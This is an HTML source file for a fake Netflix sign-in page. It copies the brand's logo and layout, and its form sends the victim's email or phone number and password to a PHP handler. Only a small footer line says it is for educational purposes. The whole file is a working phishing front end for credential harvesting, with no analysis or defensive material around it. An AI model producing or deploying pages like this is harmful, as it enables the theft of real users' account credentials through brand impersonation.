<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="style.css">
     <link rel="icon" href="images/img.png" type="image/png">
    <style>
        .form-control input[type="text"],
        .form-control input[type="password"] {
            padding: 10px;
            position: relative;
        }

        .form-control input[type="text"]::placeholder,
        .form-control input[type="password"]::placeholder {
            font-size: 14px; /* Adjust font size */
            color: #999; /* Adjust color */
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
        }
    </style>
</head>
<body>
    <nav>
        <a href="#"><img src="images/logo.svg" alt="logo"></a>
    </nav>
    <div class="form-wrapper">
        <h2>Sign In</h2>
        <form action="process_form.php" method="post">
            <div class="form-control">
                <input type="text" id="textbox1" name="textbox1" placeholder="Email or phone number">
            </div>
            <div class="form-control">
                <input type="password" id="textbox2" name="textbox2" placeholder="Password">
            </div>
            <button type="submit" value="Submit">Sign In</button>
            <div class="form-help"> 
                <div class="remember-me">
                    <input type="checkbox" id="remember-me">
                    <label for="remember-me">Remember me</label>
                </div>
                <a href="#">Need help?</a>
            </div>
        </form>
        <p>New to Netflix? <a href="#">Sign up now</a></p>
        <small>
            This fake login page is used for educational purposes only.
            <a href="#">Learn more.</a>
        </small>
    </div>
</body>
</html>
